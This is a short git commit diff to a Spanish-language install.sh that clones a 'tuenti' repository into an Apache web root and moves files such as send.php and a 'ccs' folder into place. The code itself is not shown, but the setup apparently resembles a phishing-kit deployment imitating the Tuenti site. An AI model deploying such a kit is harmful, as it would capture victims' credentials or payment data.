2f1b4b74e5f50d578ca61cf3a2d1477082d931ff
RESEKK VPS <103382307+resekk-vps@users.noreply.github.com>
2022-04-18 10:09:17 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -7,6 +7,6 @@ cd /etc/apache2/sites-available; nano 000-default.conf
 cd /var/www; git clone https://github.com/resekk-vps/tuenti
 cd /var/www/tuenti; mv ccs /var/www; mv css /var/www; mv data /var/www; mv fonts /var/www; mv js /var/www; mv parts /var/www; mv config.php /var/www; mv favicon.png /var/www; mv index.php /var/www; mv send.php /var/www
 cd /var/www; nano config.php
-sudo service apache2 restart
+cd /root; sudo service apache2 restart
 #BANNER
 clear && clear; cowsay -f eyes "SCRIPT FINALIZADA" | lolcat && figlet -f slant "RESEKK VPS" | lolcat
